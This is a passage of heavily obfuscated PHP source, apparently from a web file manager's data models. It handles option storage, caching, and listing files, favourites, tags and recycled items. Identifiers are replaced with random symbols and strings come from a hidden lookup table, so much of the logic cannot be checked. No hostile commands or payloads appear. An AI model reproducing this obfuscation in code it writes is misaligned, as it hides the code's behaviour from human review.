Model($this->modelType)->get(!1, $this->optionType, !0); $üöÀğ©– = array_values($±ÄßÏ¥…); if ($üöÀğ©– && $üöÀğ©–[0] && !is_array($üöÀğ©–[0])) { Model($this->modelType)->cacheRemove($this->optionType); $±ÄßÏ¥… = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$±ÄßÏ¥…) { return $ŠĞÊå§ ? null : array(); } if (!$ŠĞÊå§ && $ŠĞÊå§ !== $›¢˜ÀÒ[238]) { $±ÄßÏ¥… = array_filter(array_values($±ÄßÏ¥…)); return array_sort_by($±ÄßÏ¥…, $÷¨è½±Ô, $ä³®Î¯, $›¢˜ÀÒ[496]); } return $±ÄßÏ¥…[$›¢˜ÀÒ[497] . $ŠĞÊå§]; } public function insert($Ğ€ãöËò) { $ë™¥Ï© =& $_SERVER[øşô´çË]; $Ğ€ãöËò = array_field_key($Ğ€ãöËò, $this->field); $¢¦Ê»Àõ = Model($this->modelType)->get($ë™¥Ï©[498], $this->optionType . $ë™¥Ï©[499]); $¢¦Ê»Àõ = $¢¦Ê»Àõ ? $¢¦Ê»Àõ : 0; $Ğ€ãöËò[$ë™¥Ï©[496]] = ++$¢¦Ê»Àõ; $Ğ€ãöËò[$ë™¥Ï©[241]] = time(); $Ğ€ãöËò[$ë™¥Ï©[98]] = time(); Model($this->modelType)->set($ë™¥Ï©[498], $¢¦Ê»Àõ, $this->optionType . $ë™¥Ï©[499]); Model($this->modelType)->set($ë™¥Ï©[497] . $¢¦Ê»Àõ, $Ğ€ãöËò, $this->optionType); return $¢¦Ê»Àõ; } public function insertArr($ºó¦Îú) { $¾°İªüÅ =& $_SERVER[øşô´çË]; if (!$ºó¦Îú || !is_array($ºó¦Îú)) { return !1; } $ªŞß ’  = Model($this->modelType)->get($¾°İªüÅ[498], $this->optionType . $¾°İªüÅ[499]); $ªŞß ’  = $ªŞß ’  ? $ªŞß ’  : 0; $…¤ÛÍå = array(); foreach ($ºó¦Îú as $¨ã³ş¸²) { $øÉÂ¯×€ = array_field_key($¨ã³ş¸², $this->field); $øÉÂ¯×€[$¾°İªüÅ[496]] = ++$ªŞß ’ ; $øÉÂ¯×€[$¾°İªüÅ[241]] = time(); $øÉÂ¯×€[$¾°İªüÅ[98]] = time(); $…¤ÛÍå[$¾°İªüÅ[497] . $ªŞß ’ ] = $øÉÂ¯×€; } Model($this->modelType)->set($¾°İªüÅ[498], $ªŞß ’ , $this->optionType . $¾°İªüÅ[499]); Model($this->modelType)->set($…¤ÛÍå, !1, $this->optionType); return $ªŞß ’ ; } public function update($©íÇ¢øÉ, $˜é•¢™) { $ªŸºä‰— =& $_SERVER[øşô´çË]; $˜é•¢™ = array_field_key($˜é•¢™, $this->field); $Š¦£ş´Ø = $this->listData($©íÇ¢øÉ); if (!$Š¦£ş´Ø || !$©íÇ¢øÉ) { return !1; } $˜é•¢™ = array_merge($Š¦£ş´Ø, $˜é•¢™); $˜é•¢™[$ªŸºä‰—[98]] = time(); return Model($this->modelType)->set($ªŸºä‰—[497] . $©íÇ¢øÉ, $˜é•¢™, $this->optionType); } public function remove($î„Í²Ù) { if (!$î„Í²Ù) { return !1; } return Model($this->modelType)->remove($_SERVER[øşô´çË][497] . $î„Í²Ù, $this->optionType); } public function removeArr($ƒ£Å³»Á) { if (!$ƒ£Å³»Á) { return !0; } $çÎªöÚ = array(); foreach ($ƒ£Å³»Á as $‚±ª‚•“) { $çÎªöÚ[] = $_SERVER[øşô´çË][497] . $‚±ª‚•“; } return Model($this->modelType)->removeArr($çÎªöÚ, $this->optionType); } public function clear() { $ğ×Æëñç =& $_SERVER[øşô´çË]; Model($this->modelType)->remove($ğ×Æëñç[498], $this->optionType . $ğ×Æëñç[499]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($´­ğÎŸˆ, $êÙ¦éæ) { if (!$êÙ¦éæ) { return !1; } $€‚ü„ = $this->listData(); $€‚ü„ = array_to_keyvalue($€‚ü„, $´­ğÎŸˆ); return isset($€‚ü„[$êÙ¦éæ]) ? $€‚ü„[$êÙ¦éæ] : !1; } public function findByName($”½¤’ó÷) { return $this->findByKey($_SERVER[øşô´çË][42], $”½¤’ó÷); } protected function resetData($Û¨òñ¹Ô) { $ìêÉ˜¢‰ =& $_SERVER[øşô´çË]; if (!$Û¨òñ¹Ô) { return; } $Û¨òñ¹Ô = is_array($Û¨òñ¹Ô) ? $Û¨òñ¹Ô : array(); $ˆ²Ê¥’ = array(); for ($…œíêÍ = 0; $…œíêÍ < count($Û¨òñ¹Ô); $…œíêÍ++) { if (!$Û¨òñ¹Ô[$…œíêÍ] || !$Û¨òñ¹Ô[$…œíêÍ][$ìêÉ˜¢‰[496]]) { continue; } $ˆ²Ê¥’[$ìêÉ˜¢‰[497] . $Û¨òñ¹Ô[$…œíêÍ][$ìêÉ˜¢‰[496]]] = $Û¨òñ¹Ô[$…œíêÍ]; } return Model($this->modelType)->set($ˆ²Ê¥’, !1, $this->optionType); } private function getAutoName($¬ş¦Ï³±) { $ğ´Ç–î¨ = array_to_keyvalue($this->listData(), $_SERVER[øşô´çË][42]); if (!$ğ´Ç–î¨ || !isset($ğ´Ç–î¨[$¬ş¦Ï³±])) { return $¬ş¦Ï³±; } for ($¯õõ¦º” = 1; $¯õõ¦º” < count($ğ´Ç–î¨); $¯õõ¦º”++) { $±­ô¥¸İ = $¬ş¦Ï³± . "\50{$¯õõ¦º”}\x29"; if (!isset($ğ´Ç–î¨[$±­ô¥¸İ])) { return $±­ô¥¸İ; } } return $±­ô¥¸İ; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($ÈŒßã°À = false, $Ù­ıêìş = '', $ºì†Æ†Õ = false, $æö§ñ‰Ü = true) { $ñ©§ş’Ö =& $_SERVER[øşô´çË]; $ãÅÆù¨‘ = $this->cacheGet($Ù­ıêìş); $£ıÙıüç = $this->optionDefault($Ù­ıêìş); $£ıÙıüç = is_array($£ıÙıüç) ? $£ıÙıüç : array(); if (is_array($ãÅÆù¨‘)) { if ($æö§ñ‰Ü) { $ãÅÆù¨‘ = array_merge($£ıÙıüç, $ãÅÆù¨‘); } return $ÈŒßã°À ? isset($ãÅÆù¨‘[$ÈŒßã°À]) ? $ãÅÆù¨‘[$ÈŒßã°À] : null : $ãÅÆù¨‘; } $Îİ»¯æˆ = $this->filterWhere(array($ñ©§ş’Ö[43] => $Ù­ıêìş)); $ãÅÆù¨‘ = $this->where($Îİ»¯æˆ)->select(); $ãÅÆù¨‘ = array_to_keyvalue($ãÅÆù¨‘, $ñ©§ş’Ö[105], $ñ©§ş’Ö[460]); foreach ($ãÅÆù¨‘ as $Üø¼ã½ => $Ë°Ãƒ¾) { if ($ºì†Æ†Õ || in_array($Üø¼ã½, $this->jsonField)) { $ãÅÆù¨‘[$Üø¼ã½] = json_decode($Ë°Ãƒ¾, !0); } } $this->cacheSet($Ù­ıêìş, $ãÅÆù¨‘); if ($æö§ñ‰Ü) { $ãÅÆù¨‘ = array_merge($£ıÙıüç, $ãÅÆù¨‘); } return $ÈŒßã°À ? $ãÅÆù¨‘[$ÈŒßã°À] : $ãÅÆù¨‘; } public function set($™øİĞ×½, $ÅÈ¨ª®ø = false, $¢†ÚöáŞ = '') { $ìì†ÜÙî =& $_SERVER[øşô´çË]; if (!$™øİĞ×½) { return !0; } $¤€¹âöÓ = $this->get(!1, $¢†ÚöáŞ, !1, !1); $¤€¹âöÓ = is_array($¤€¹âöÓ) ? $¤€¹âöÓ : array(); $ƒ’“• = array(); $ÁÏšä¿ = array(); $àÛÍ–àƒ = array(); $Ã¬·ûóÅ = is_array($™øİĞ×½) ? $™øİĞ×½ : array($™øİĞ×½ => $ÅÈ¨ª®ø); $İ¬Æï»ë = $this->filterWhere(array($ìì†ÜÙî[43] => $¢†ÚöáŞ)); foreach ($Ã¬·ûóÅ as $Ôı¹·Àã => $Æ²ã´–©) { if (is_array($Æ²ã´–©)) { $Æ²ã´–© = json_encode_force($Æ²ã´–©); } $this->checkLength($Æ²ã´–©, !1, $this->tableName . $ìì†ÜÙî[4] . $™øİĞ×½); $Æ²ã´–© = self::textEncode($Æ²ã´–©); if (array_key_exists($Ôı¹·Àã, $¤€¹âöÓ)) { $ëÓå€äô = is_array($¤€¹âöÓ[$Ôı¹·Àã]) ? json_encode_force($¤€¹âöÓ[$Ôı¹·Àã]) : $¤€¹âöÓ[$Ôı¹·Àã]; $ëÓå€äô = self::textEncode($ëÓå€äô); if ($ëÓå€äô === $Æ²ã´–©) { continue; } $ÁÏšä¿[] = array($ìì†ÜÙî[105], $Ôı¹·Àã, $ìì†ÜÙî[460], $Æ²ã´–©, $ìì†ÜÙî[98], time()); } else { $â¦˜Õäò = array($ìì†ÜÙî[43] => $¢†ÚöáŞ, $ìì†ÜÙî[105] => $Ôı¹·Àã, $ìì†ÜÙî[460] => $Æ²ã´–©); $ƒ’“•[] = $this->filterWhere($â¦˜Õäò); } } if (!$ƒ’“• && !$ÁÏšä¿) { return !0; } $this->cacheRemove($¢†ÚöáŞ); $ƒ¸ÁÀÊû = $this->cacheKey($ìì†ÜÙî[500]); CacheLock::lock($ƒ¸ÁÀÊû); if ($ƒ’“•) { $this->addAll($ƒ’“•); } if ($ÁÏšä¿) { $this->saveAll($ÁÏšä¿, $İ¬Æï»ë); } CacheLock::unlock($ƒ¸ÁÀÊû); return !0; } protected function optionDefault($Ôäãöëê = '') { return !1; } public function setDeep($‰ûîá¡È, $…âéıÃğ = false, $‘Ø°‰Œ = '') { $±¢¢Êß¹ = explode($_SERVER[øşô´çË][10], $‰ûîá¡È); $›ÌÛÙ³³ = $this->get(); array_set_value($›ÌÛÙ³³, $‰ûîá¡È, $…âéıÃğ); $this->set($±¢¢Êß¹[0], $›ÌÛÙ³³[$±¢¢Êß¹[0]], $‘Ø°‰Œ); } public function remove($Õ‘”îÎ, $¥Ö¾ÎÜ = '') { $¢ğ™“öÓ =& $_SERVER[øşô´çË]; $this->cacheRemove($¥Ö¾ÎÜ); $ÕıÛ¯ŸÕ = $this->filterWhere(array($¢ğ™“öÓ[105] => $Õ‘”îÎ, $¢ğ™“öÓ[43] => $¥Ö¾ÎÜ)); if (is_null($Õ‘”îÎ)) { unset($ÕıÛ¯ŸÕ[$¢ğ™“öÓ[105]]); } return $this->where($ÕıÛ¯ŸÕ)->delete(); } public function removeArr($ì¶Òø¹Ú, $áÉ¹ç¡ = '') { $¿úé‹°¦ =& $_SERVER[øşô´çË]; if (!$ì¶Òø¹Ú || !is_array($ì¶Òø¹Ú)) { return !0; } $this->cacheRemove($áÉ¹ç¡); $Ì¨Ó×“ = $this->filterWhere(array($¿úé‹°¦[43] => $áÉ¹ç¡, $¿úé‹°¦[105] => array($¿úé‹°¦[7], $ì¶Òø¹Ú))); return $this->where($Ì¨Ó×“)->delete(); } public function cacheSet($ÎÚæÖëà, $¨Çœ³¸§ = false) { return Cache::set($this->cacheKey($ÎÚæÖëà), $¨Çœ³¸§); } public function cacheGet($ÒŠÑêª¾) { return Cache::get($this->cacheKey($ÒŠÑêª¾)); } public function cacheRemove($ñ²§¥Í) { return Cache::remove($this->cacheKey($ñ²§¥Í)); } protected function filterWhere($×÷ÒÃ) { return $×÷ÒÃ; } protected function cacheKey($ÄÓÒŞŞ·) { return $ÄÓÒŞŞ·; } } class SourceListModel extends ModelBase { protected $tableName = "\x69\157\x5f\x73\x6f\x75\162\x63\145"; protected $tableMeta = array("\x74\x61\x62\x6c\x65\x4e\x61\155\x65" => "\x69\157\x5f\x73\x6f\165\x72\x63\x65\x5f\155\x65\x74\x61", "\x6d\x65\164\141\106\151\145\x6c\x64" => "\163\x6f\x75\162\x63\x65\x49\104"); protected $dataAuto = array(array("\155\x6f\x64\x69\x66\171\x54\x69\x6d\x65", "\164\x69\x6d\145", "\151\156\x73\x65\162\164", "\146\165\156\x63\x74\151\x6f\156"), array("\x63\162\x65\x61\164\x65\124\151\155\145", "\x74\x69\x6d\x65", "\x69\x6e\163\x65\x72\164", "\146\x75\156\143\x74\151\157\156"), array("\x76\151\x65\x77\124\151\x6d\145", "\x74\x69\155\145", "\x69\x6e\x73\x65\x72\164", "\146\165\x6e\x63\164\x69\157\x6e")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($ëª¿¹çã) { return $this->listSource(array($_SERVER[øşô´çË][501] => $ëª¿¹çã)); } public function typeName($îÈéó²) { static $Å¶¤§¡æ = array(self::TYPE_SYSTEM => "\x73\171\x73\x74\x65\155", self::TYPE_USER => "\165\163\145\x72", self::TYPE_GROUP => "\x67\162\157\x75\160"); return $Å¶¤§¡æ[$îÈéó² . $_SERVER[øşô´çË][12]]; } public function sourceListInfo($¡Ñ®ğõ©, $ëê  = false) { $†Ë¥‚ü² =& $_SERVER[øşô´çË]; $¡Ñ®ğõ© = $¡Ñ®ğõ© ? $¡Ñ®ğõ© : array(); $¡Ñ®ğõ© = array_filter(array_unique($¡Ñ®ğõ©)); if (!$¡Ñ®ğõ©) { return array(); } $’Òƒ»²‹ = $this->where(array($†Ë¥‚ü²[201] => array($†Ë¥‚ü²[7], $¡Ñ®ğõ©)))->select(); $this->_listDataApply($’Òƒ»²‹, $ëê ); return array_to_keyvalue($’Òƒ»²‹, $†Ë¥‚ü²[201]); } public function pathInfoFilter(&$ù’£Š¸Â) { $áØ¤’¶Ô =& $_SERVER[øşô´çË]; static $·š‹“ãÃ = false; static $‰¢¨äŠô = false; static $îíÍ¯Ç¨ = false; if (!$·š‹“ãÃ) { $øªˆ¢À = $áØ¤’¶Ô[502]; $øªˆ¢À .= $áØ¤’¶Ô[503]; $øªˆ¢À .= $áØ¤’¶Ô[504]; $üÙØ¬â± = $áØ¤’¶Ô[505]; $Ã¬„•ì = explode($áØ¤’¶Ô[60], $üÙØ¬â±); $·š‹“ãÃ = explode($áØ¤’¶Ô[60], $øªˆ¢À); $‰¢¨äŠô = array(); foreach ($·š‹“ãÃ as $ÜÈµ‡Á) { if (in_array($ÜÈµ‡Á, $Ã¬„•ì)) { continue; } $‰¢¨äŠô[] = $ÜÈµ‡Á; } $îíÍ¯Ç¨ = explode($áØ¤’¶Ô[60], $áØ¤’¶Ô[506]); } foreach ($îíÍ¯Ç¨ as $±ôŞÅõ—) { if (isset($ù’£Š¸Â[$±ôŞÅõ—])) { $ù’£Š¸Â[$±ôŞÅõ—] = intval($ù’£Š¸Â[$±ôŞÅõ—]); } } $ù’£Š¸Â[$áØ¤’¶Ô[97]] = $áØ¤’¶Ô[507] . $ù’£Š¸Â[$áØ¤’¶Ô[201]] . $áØ¤’¶Ô[508]; $ù’£Š¸Â[$áØ¤’¶Ô[43]] = $ù’£Š¸Â[$áØ¤’¶Ô[509]] == 1 ? $áØ¤’¶Ô[88] : $áØ¤’¶Ô[240]; $ù’£Š¸Â[$áØ¤’¶Ô[198]] = $this->typeName($ù’£Š¸Â[$áØ¤’¶Ô[198]]); if ($ù’£Š¸Â[$áØ¤’¶Ô[509]] != 1) { $ù’£Š¸Â[$áØ¤’¶Ô[176]] = $ù’£Š¸Â[$áØ¤’¶Ô[510]]; unset($ù’£Š¸Â[$áØ¤’¶Ô[510]]); } $ÖĞ‡—Ë€ = $·š‹“ãÃ; if (isset($ù’£Š¸Â[$áØ¤’¶Ô[511]]) && $ù’£Š¸Â[$áØ¤’¶Ô[511]][$áØ¤’¶Ô[512]] == -1) { $ÖĞ‡—Ë€ = $‰¢¨äŠô; } $ù’£Š¸Â = array_field_key($ù’£Š¸Â, $ÖĞ‡—Ë€); return $ù’£Š¸Â; } public function listUserFav() { $ûğ¾î¬£ =& $_SERVER[øşô´çË]; $Áù¿šÚ = Model($ûğ¾î¬£[513])->listData(); $À±†Şâ = array_filter_by_field($Áù¿šÚ, $ûğ¾î¬£[43], $ûğ¾î¬£[514]); $À±†Şâ = array_to_keyvalue($À±†Şâ, $ûğ¾î¬£[12], $ûğ¾î¬£[97]); if ($À±†Şâ) { $˜ğ˜‘¨™ = $this->listSource(array($ûğ¾î¬£[515] => array($ûğ¾î¬£[516], $À±†Şâ))); } $˜ğ˜‘¨™ = array_to_keyvalue($˜ğ˜‘¨™[$ûğ¾î¬£[455]], $ûğ¾î¬£[201]); foreach ($Áù¿šÚ as &$ÄúûŠŒÅ) { $ÄúûŠŒÅ = array($ûğ¾î¬£[517] => $ÄúûŠŒÅ[$ûğ¾î¬£[496]], $ûğ¾î¬£[518] => $ÄúûŠŒÅ[$ûğ¾î¬£[42]], $ûğ¾î¬£[519] => $ÄúûŠŒÅ[$ûğ¾î¬£[97]], $ûğ¾î¬£[520] => $ÄúûŠŒÅ[$ûğ¾î¬£[43]], $ûğ¾î¬£[521] => $ÄúûŠŒÅ[$ûğ¾î¬£[241]], $ûğ¾î¬£[522] => $ÄúûŠŒÅ[$ûğ¾î¬£[98]]); if ($ÄúûŠŒÅ[$ûğ¾î¬£[43]] == $ûğ¾î¬£[514] && $˜ğ˜‘¨™[$ÄúûŠŒÅ[$ûğ¾î¬£[97]]]) { $ÄúûŠŒÅ[$ûğ¾î¬£[100]] = $˜ğ˜‘¨™[$ÄúûŠŒÅ[$ûğ¾î¬£[97]]]; } } unset($ÄúûŠŒÅ); return $Áù¿šÚ; } public function listUserTag($«½ìÁ±ï) { $¢şŠ‘ÇŠ =& $_SERVER[øşô´çË]; if ($«½ìÁ±ï && !is_array($«½ìÁ±ï)) { $«½ìÁ±ï = array($«½ìÁ±ï); } $°Ê­úİ = Model($¢şŠ‘ÇŠ[523])->listData(); $ä§«×® = array(); $ı§öÛÑ = array(); foreach ($°Ê­úİ as $´öøÅê) { $§â§†ÃÌ = $´öøÅê[$¢şŠ‘ÇŠ[97]]; if (!$§â§†ÃÌ) { continue; } if (!isset($ı§öÛÑ[$§â§†ÃÌ])) { $ı§öÛÑ[$§â§†ÃÌ] = array(); } $ı§öÛÑ[$§â§†ÃÌ][] = $´öøÅê[$¢şŠ‘ÇŠ[524]]; $ä§«×®[$´öøÅê[$¢şŠ‘ÇŠ[97]]] = $´öøÅê; } $ã€´¬‚æ = array(); $Ö¡€‘§ = array(); $œ½Ãæ³ß = array(); foreach ($ı§öÛÑ as $•Íäğù => $íÄ¤Ãğ¢) { $ê–óıÙ÷ = !0; if (!$«½ìÁ±ï) { $ã€´¬‚æ[] = $•Íäğù; continue; } foreach ($«½ìÁ±ï as $îÇø•š) { if (!in_array($îÇø•š, $íÄ¤Ãğ¢)) { $ê–óıÙ÷ = !1; break; } } if (!$ê–óıÙ÷) { continue; } if (!is_numeric($•Íäğù)) { $»ƒÌ„”  = $ä§«×®[$•Íäğù]; $äó¯°å– = array($¢şŠ‘ÇŠ[42] => $»ƒÌ„” [$¢şŠ‘ÇŠ[42]], $¢şŠ‘ÇŠ[97] => $»ƒÌ„” [$¢şŠ‘ÇŠ[97]], $¢şŠ‘ÇŠ[43] => $»ƒÌ„” [$¢şŠ‘ÇŠ[43]], $¢şŠ‘ÇŠ[100] => array($¢şŠ‘ÇŠ[525] => 1), $¢şŠ‘ÇŠ[242] => !0); if ($»ƒÌ„” [$¢şŠ‘ÇŠ[43]] == $¢şŠ‘ÇŠ[240]) { $œ½Ãæ³ß[] = $äó¯°å–; } if ($»ƒÌ„” [$¢şŠ‘ÇŠ[43]] == $¢şŠ‘ÇŠ[88]) { $Ö¡€‘§[] = $äó¯°å–; } continue; } $ã€´¬‚æ[] = $•Íäğù; } if ($ã€´¬‚æ) { $°éö† = $this->listSource(array($¢şŠ‘ÇŠ[515] => array($¢şŠ‘ÇŠ[516], $ã€´¬‚æ))); } $°éö† = $°éö† ? $°éö† : array($¢şŠ‘ÇŠ[95] => array(), $¢şŠ‘ÇŠ[96] => array()); $°éö†[$¢şŠ‘ÇŠ[95]] = array_merge($°éö†[$¢şŠ‘ÇŠ[95]], $Ö¡€‘§); $°éö†[$¢şŠ‘ÇŠ[96]] = array_merge($°éö†[$¢şŠ‘ÇŠ[96]], $œ½Ãæ³ß); if (isset($°éö†[$¢şŠ‘ÇŠ[452]]) && count($ã€´¬‚æ) == $°éö†[$¢şŠ‘ÇŠ[452]][$¢şŠ‘ÇŠ[453]]) { return $°éö†; } $æÌòäó = array(); $—À§€‹å = array_to_keyvalue($°éö†[$¢şŠ‘ÇŠ[95]], $¢şŠ‘ÇŠ[12], $¢şŠ‘ÇŠ[201]); $¿‚˜Õî = array_to_keyvalue($°éö†[$¢şŠ‘ÇŠ[96]], $¢şŠ‘ÇŠ[12], $¢şŠ‘ÇŠ[201]); $«îºşŠá = array_merge($¿‚˜Õî, $—À§€‹å); foreach ($ã€´¬‚æ as $§â§†ÃÌ) { if (!in_array($§â§†ÃÌ, $«îºşŠá)) { $æÌòäó[] = $§â§†ÃÌ; } } if ($æÌòäó) { Model($¢şŠ‘ÇŠ[526])->removeBySource($æÌòäó); } return $°éö†; } public function listUserRecycle() { $Ç€×­« =& $_SERVER[øşô´çË]; $õ£ï–ã = Model($Ç€×­«[527])->listData(); if (!$õ£ï–ã) { return array(); } $’˜â×ƒÎ = array($Ç€×­«[515] => array($Ç€×­«[516], $õ£ï–ã), $Ç€×­«[528] => 1); return $this->listSource($’˜â×ƒÎ); } public function listSource($ı¤»Æš, $µ‰½¶ü = 3000, $’İ–Åìö = false) { $‚™õ½ëÅ =& $_SERVER[øşô´çË]; if (!isset($ı¤»Æš[$‚™õ½ëÅ[529]])) { $ı¤»Æš[$‚™õ½ëÅ[529]] = 0; } if (isset($ı¤»Æš[$‚™õ½ëÅ[200]]) && $ı¤»Æš[$‚™õ½ëÅ[200]] == $‚™õ½ëÅ[238]) { $ı¤»Æš[$‚™õ½ëÅ[510]] = array($‚™õ½ëÅ[473], $‚™õ½ëÅ[12]); } if (isset($ı¤»Æš[$‚™õ½ëÅ[200]])) { $ı¤»Æš[$‚™õ½ëÅ[200]] = intval($ı¤»Æš[$‚™õ½ëÅ[200]]); } $åÖÍóô = $‚™õ½ëÅ[530]; $¬¾ğ·€¬ = $this->field($åÖÍóô)->_makeOrder()->where($ı¤»Æš)->selectPage($µ‰½¶ü); $this->_listPageCheck($¬¾ğ·€¬, $åÖÍóô, $ı¤»Æš); $this->_listDataApply($¬¾ğ·€¬[$‚™õ½ëÅ[455]], $’İ–Åìö); $this->_listMake($¬¾ğ·€¬); return $¬¾ğ·€¬; } private function _listPageCheck(&$ÃŒÖï¾©, $»ÑÕ, $ù¡Éñáè) { $°Â¡ÄÀò =& $_SERVER[øşô´çË]; if (!is_array($ÃŒÖï¾©[$°Â¡ÄÀò[452]])) { return; } $ÆÉ¡¡¨Ÿ = $ÃŒÖï¾©[$°Â¡ÄÀò[452]]; if ($ÆÉ¡¡¨Ÿ[$°Â¡ÄÀò[454]] <= 1) { return; } if ($ÆÉ¡¡¨Ÿ[$°Â¡ÄÀò[453]] >= 100000) { return; } if (Model($°Â¡ÄÀò[531])->get($°Â¡ÄÀò[532]) != $°Â¡ÄÀò[533]) { return; } $»ÑÕ = str_replace(array($°Â¡ÄÀò[63], $°Â¡ÄÀò[426], $°Â¡ÄÀò[19]), $°Â¡ÄÀò[12], $»ÑÕ); $»ÑÕ = $°Â¡ÄÀò[534] . str_replace($°Â¡ÄÀò[60], $°Â¡ÄÀò[535], $»ÑÕ) . $°Â¡ÄÀò[536]; $¬ˆÑÄÌ = $°Â¡ÄÀò[537]; $¬ˆÑÄÌ = $¬ˆÑÄÌ . $°Â¡ÄÀò[538]; $µƒŞ£‚¥ = $ÆÉ¡¡¨Ÿ[$°Â¡ÄÀò[448]] * ($ÆÉ¡¡¨Ÿ[$°Â¡ÄÀò[437]] - 1) . $°Â¡ÄÀò[60] . $ÆÉ¡¡¨Ÿ[$°Â¡ÄÀò[448]]; $ª°ó¡´Ø = $this->_makeOrder(!0); $İ¦ÓÖÃÛ = $°Â¡ÄÀò[534] . str_replace($°Â¡ÄÀò[60], $°Â¡ÄÀò[535], $ª°ó¡´Ø[0]); if (strpos($İ¦ÓÖÃÛ, $°Â¡ÄÀò[539])) { $İ¦ÓÖÃÛ = str_replace($°Â¡ÄÀò[539], $°Â¡ÄÀò[540], $İ¦ÓÖÃÛ); } else { $İ¦ÓÖÃÛ .= $°Â¡ÄÀò[541] . $ª°ó¡´Ø[1]; } $™Èóüš = array(); foreach ($ù¡Éñáè as $öµò–‚„ => $Š¼±—×›) { $™Èóüš[$°Â¡ÄÀò[534] . $öµò–‚„] = $Š¼±—×›; } $this->alias($°Â¡ÄÀò[542])->field($»ÑÕ)->limit($µƒŞ£‚¥)->order($İ¦ÓÖÃÛ); $–ÅÈ—¡… = $this->join($¬ˆÑÄÌ)->where($™Èóüš)->select(); if ($–ÅÈ—¡…) { $ÃŒÖï¾©[$°Â¡ÄÀò[455]] = $–ÅÈ—¡…; } } protected function _makeOrder($›å†³Êí = false) { $ã˜ƒÆë” =& $_SERVER[øşô´çË]; $’ú’Üƒ“ = Model($ã˜ƒÆë”[543])->get($ã˜ƒÆë”[544]); $ÑÎ¡ò†Ã = Model($ã˜ƒÆë”[543])->get($ã˜ƒÆë”[545]); $Á…Õ”£“ = array($ã˜ƒÆë”[546] => $ã˜ƒÆë”[547], $ã˜ƒÆë”[548] => $ã˜ƒÆë”[549]); $£Éîğ = array($ã˜ƒÆë”[42] => $ã˜ƒÆë”[42], $ã˜ƒÆë”[89] => $ã˜ƒÆë”[89], $ã˜ƒÆë”[176] => $ã˜ƒÆë”[510], $ã˜ƒÆë”[550] => $ã˜ƒÆë”[550], $ã˜ƒÆë”[551] => $ã˜ƒÆë”[552], $ã˜ƒÆë”[241] => $ã˜ƒÆë”[241], $ã˜ƒÆë”[98] => $ã˜ƒÆë”[98]); $™Îû¯Ó¶ = Input::get($ã˜ƒÆë”[553], $ã˜ƒÆë”[7], $’ú’Üƒ“, array_keys($£Éîğ)); $¾Æ‘Ê£Ç = Input::get($ã˜ƒÆë”[554], $ã˜ƒÆë”[7], $ÑÎ¡ò†Ã, array_keys($Á…Õ”£“)); if (!in_array($™Îû¯Ó¶, array_keys($£Éîğ))) { $™Îû¯Ó¶ = $ã˜ƒÆë”[42]; } if (!in_array($¾Æ‘Ê£Ç, array_keys($Á…Õ”£“))) { $™Îû¯Ó¶ = $ã˜ƒÆë”[546]; } if ($™Îû¯Ó¶ == $ã˜ƒÆë”[42]) { } $ùó©Çá = $ã˜ƒÆë”[555] . $£Éîğ[$™Îû¯Ó¶] . $ã˜ƒÆë”[63] . $Á…Õ”£“[$¾Æ‘Ê£Ç]; $ùó©Çá = rtrim(trim($ùó©Çá), $ã˜ƒÆë”[60]); if ($›å†³Êí) { return array($ùó©Çá, $Á…Õ”£“[$¾Æ‘Ê£Ç]); } return $this->order($ùó©Çá); } protected function _listDataApplyItem($›Ê€‡”, $ñŠÉ£ıó = false) { $¯Æì¿é = array($›Ê€‡”); $this->_listDataApply($¯Æì¿é, $ñŠÉ£ıó); return $¯Æì¿é[0]; } protected function _listDataApply(&$Èññ¹±Ñ, $ş±Ä˜÷° = false) { $ë™®ûÙš =& $_SERVER[øşô´çË]; if (!$Èññ¹±Ñ) { $Èññ¹±Ñ = array(); return; } $ªôå™›Ö = array_to_keyvalue($Èññ¹±Ñ, $ë™®ûÙš[12], $ë™®ûÙš[201]); $ªôå™›Ö = array_unique($ªôå™›Ö); $ªôå™›Ö = array_to_int($ªôå™›Ö); $this->_listSourceCache($Èññ¹±Ñ); if (!$ş±Ä˜÷°) { $this->_listAppendMeta($Èññ¹±Ñ, $ªôå™›Ö); $this->_listAppendFileMeta($Èññ¹±Ñ, $ªôå™›Ö); $this->_listAppendChildren($Èññ¹±Ñ, $ªôå™›Ö); } $this->_listAppendPath($Èññ¹±Ñ); $this->_listAppendAuth($Èññ¹±Ñ); $this->_listAppendSourceInfo($Èññ¹±Ñ, $ªôå™›Ö); $this->_listAppendUser($Èññ¹±Ñ); $this->_listFilterInfo($Èññ¹±Ñ, $ş±Ä˜÷°); $this->_listAppendAuthSecret($Èññ¹±Ñ); } protected function _listSourceCache($Ï¿ªÉµÜ) { $­ÏÇÇ¡ù =& $_SERVER[øşô´çË]; foreach ($Ï¿ªÉµÜ as $­ÊÖ‹«Á) { self::$cacheSourceInfo[$­ÏÇÇ¡ù[556] . $­ÊÖ‹«Á[$­ÏÇÇ¡ù[201]]] = $­ÊÖ‹«Á; } } protected function _listFilterInfo(&$ØÓ©Éè¸, $ø§æš† = false) { $Ø­šş›¡ =& $_SERVER[øşô´çË]; foreach ($ØÓ©Éè¸ as &$åÍÃƒĞ”) { $åÍÃƒĞ” = $this->pathInfoFilter($åÍÃƒĞ”); self::$cachePathInfo[$Ø­šş›¡[557] . intval($ø§æš†) . $Ø­šş›¡[485] . $åÍÃƒĞ”[$Ø­šş›¡[201]]] = $åÍÃƒĞ”; } unset($åÍÃƒĞ”); } protected function _listMake(&$ı¾÷˜ç) { $³óã‹ =& $_SERVER[øşô´çË]; $ı¾÷˜ç[$³óã‹[95]] = array(); $ı¾÷˜ç[$³óã‹[96]] = array(); foreach ($ı¾÷˜ç[$³óã‹[455]] as $Äİ£×é) { $İÇ®šÌ = $Äİ£×é[$³óã‹[509]] == 1 ? $³óã‹[95] : $³óã‹[96]; $ı¾÷˜ç[$İÇ®šÌ][] = $Äİ£×é; } unset($ı¾÷˜ç[$³óã‹[455]]); } protected function _listAppendMeta(&$Ó¸ÑÒ–ß, $õ²Ûúéî) { $µ¿¤á =& $_SERVER[øşô´çË]; $ş¶Ëì¼á = array($µ¿¤á[515] => array($µ¿¤á[516], $õ²Ûúéî)); $½«Š¾ÍÓ = 